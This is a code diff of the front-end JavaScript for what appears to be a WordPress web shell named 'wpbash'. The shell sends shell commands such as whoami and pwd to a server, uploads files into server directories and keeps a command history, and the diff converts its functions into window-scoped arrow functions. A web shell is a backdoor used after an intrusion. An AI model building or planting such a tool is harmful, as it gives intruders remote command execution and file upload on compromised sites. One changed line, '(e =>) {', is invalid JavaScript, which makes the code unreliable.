@@ -18,7 +18,7 @@
         var fileBrowserElement = document.getElementById("wpbash_filebrowser");
         getShellInfo();
         
-        function getShellInfo() {
+        window.getShellInfo = () => {
             var request = new XMLHttpRequest();
             
             request.onreadystatechange = function() {
@@ -38,7 +38,7 @@
             request.send("cmd=whoami&hostname&pwd&action=wpbash");
         }
                     
-        function sendCommand() {
+        window.sendCommand = () => {
             var request = new XMLHttpRequest();
             var command = inputTextElement.value;
             var originalCommand = command;
@@ -93,7 +93,7 @@
             return false;
         }
         
-        function uploadFile() {
+        window.uploadFile = () => {
             var formData = new FormData();
             formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
             formData.append('path', currentDir);
@@ -111,13 +111,13 @@
             outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
         }
         
-        function updateInputWidth() {
+        window.updateInputWidth = () => {
             inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
         }
         
         document.onkeydown = checkForArrowKeys;
 
-        function checkForArrowKeys(e) {
+        window.checkForArrowKeys = (e =>) {
             e = e || window.event;
 
             if (e.keyCode == '38') {
@@ -127,19 +127,19 @@
             }
         }
         
-        function previousCommand() {
+        window.previousCommand = () => {
             if (currentCommand != 0) {
                 switchCommand(currentCommand-1);
             }
         }
         
-        function nextCommand() {
+        window.nextCommand = () => {
             if (currentCommand != commandHistory.length) {
                 switchCommand(currentCommand+1);
             }
         }
         
-        function switchCommand(newCommand) {
+        window.switchCommand = (newCommand) => {
             currentCommand = newCommand;
 
             if (currentCommand == commandHistory.length) {
